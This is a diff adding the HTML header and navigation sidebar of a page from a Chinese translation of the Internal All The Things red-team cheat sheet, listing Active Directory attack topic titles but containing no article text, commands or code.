@@ -1,0 +1,7423 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="内网渗透与 Active Directory 实战攻防速查表 (中文翻译版)">
+      
+      
+      
+        <link rel="canonical" href="https://n00o00b.github.io/InternalAllTheThings_CN/zh/redteam/evasion/windows-defenses/">
+      
+      
+        <link rel="prev" href="../windows-amsi-bypass/">
+      
+      
+        <link rel="next" href="../windows-dpapi/">
+      
+      
+        
+          <link rel="alternate" href="../../../../redteam/evasion/windows-defenses/" hreflang="en">
+        
+          <link rel="alternate" href="./" hreflang="zh">
+        
+      
+      
+      <link rel="icon" href="../../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.2">
+    
+    
+      
+        <title>Windows - 防御 - Internal All The Things (中文版)</title>
+      
+    
+    
+	
+      <link rel="stylesheet" href="../../../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+  <style>
+  .social-container {
+    float: right;
+  }
+  </style>
+
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../custom.css">
+    
+    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  
+<meta property="og:type" content="website" />
+<meta property="og:title" content="Windows - 防御 - Internal All The Things (中文版)" />
+<meta property="og:description" content="内网渗透与 Active Directory 实战攻防速查表 (中文翻译版)" />
+<meta property="og:image" content="https://n00o00b.github.io/InternalAllTheThings_CN/assets/images/social/zh/redteam/evasion/windows-defenses.png" />
+<meta property="og:image:type" content="image/png" />
+<meta property="og:image:width" content="1200" />
+<meta property="og:image:height" content="630" />
+<meta property="og:url" content="https://n00o00b.github.io/InternalAllTheThings_CN/zh/redteam/evasion/windows-defenses/" />
+<meta property="twitter:card" content="summary_large_image" />
+<meta property="twitter:title" content="Windows - 防御 - Internal All The Things (中文版)" />
+<meta property="twitter:description" content="内网渗透与 Active Directory 实战攻防速查表 (中文翻译版)" />
+<meta property="twitter:image" content="https://n00o00b.github.io/InternalAllTheThings_CN/assets/images/social/zh/redteam/evasion/windows-defenses.png" />
+</head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#windows-" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../../../" title="Internal All The Things (中文版)" class="md-header__button md-logo" aria-label="Internal All The Things (中文版)" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Internal All The Things (中文版)
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Windows - 防御
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+      <div class="md-header__option">
+  <div class="md-select">
+    
+    <button class="md-header__button md-icon" aria-label="选择当前语言">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m12.87 15.07-2.54-2.51.03-.03A17.5 17.5 0 0 0 14.07 6H17V4h-7V2H8v2H1v2h11.17C11.5 7.92 10.44 9.75 9 11.35 8.07 10.32 7.3 9.19 6.69 8h-2c.73 1.63 1.73 3.17 2.98 4.56l-5.09 5.02L4 19l5-5 3.11 3.11zM18.5 10h-2L12 22h2l1.12-3h4.75L21 22h2zm-2.62 7 1.62-4.33L19.12 17z"/></svg>
+    </button>
+    <div class="md-select__inner">
+      <ul class="md-select__list">
+        
+          <li class="md-select__item">
+            <a href="../../../../redteam/evasion/windows-defenses/" hreflang="en" class="md-select__link">
+              English
+            </a>
+          </li>
+        
+          <li class="md-select__item">
+            <a href="./" hreflang="zh" class="md-select__link">
+              中文
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</div>
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="分享" aria-label="分享" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/n00o00b/InternalAllTheThings_CN" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../" title="Internal All The Things (中文版)" class="md-nav__button md-logo" aria-label="Internal All The Things (中文版)" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Internal All The Things (中文版)
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/n00o00b/InternalAllTheThings_CN" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Internal All The Things（中文版）
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../DISCLAIMER/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    免责声明
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active directory
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Active directory
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-adcs-certificate-services/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active Directory - 证书服务
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-adcs-esc/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active Directory - 证书 ESC 攻击
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-adcs-esc01/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active Directory - 证书 ESC1
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-adcs-esc02/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active Directory - 证书 ESC2
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-adcs-esc03/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active Directory - 证书 ESC3
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-adcs-esc04/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active Directory - 证书 ESC4
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-adcs-esc05/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active Directory - 证书 ESC5
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-adcs-esc06/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active Directory - 证书 ESC6
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-adcs-esc07/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active Directory - 证书 ESC7
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-adcs-esc08/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active Directory - 证书 ESC8
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-adcs-esc09/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active Directory - 证书 ESC9
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-adcs-esc10/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active Directory - 证书 ESC10
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-adcs-esc11/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active Directory - 证书 ESC11
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-adcs-esc12/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active Directory - 证书 ESC12
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-adcs-esc13/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active Directory - 证书 ESC13
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-adcs-esc14/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active Directory - 证书 ESC14
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-adcs-esc15/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active Directory - 证书 ESC15
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-adcs-golden-certificate/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active Directory - 黄金证书
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-adds-acl-ace/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active Directory - 访问控制 ACL/ACE
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-adds-enumerate/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active Directory - 枚举
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-adds-group-policy-objects/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active Directory - 组策略对象
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-adds-groups/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active Directory - 组
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-adds-linux/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active Directory - Linux
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-adds-machineaccountquota/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active Directory - 机器帐户配额
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-adds-ntds-dumping/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active Directory - NTDS 导出
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-adds-recycle-bin/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active Directory - 回收站
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-adds-rodc/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active Directory - 只读域控制器
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-adfs-federation-services/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active Directory - 联合身份验证服务
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-integrated-dns/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active Directory - 集成 DNS - ADIDNS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-roasting-asrep/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Roasting - AS-REP Roasting
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-roasting-kerberoasting/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Roasting - Kerberoasting
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/ad-roasting-timeroasting/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Roasting - Timeroasting
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
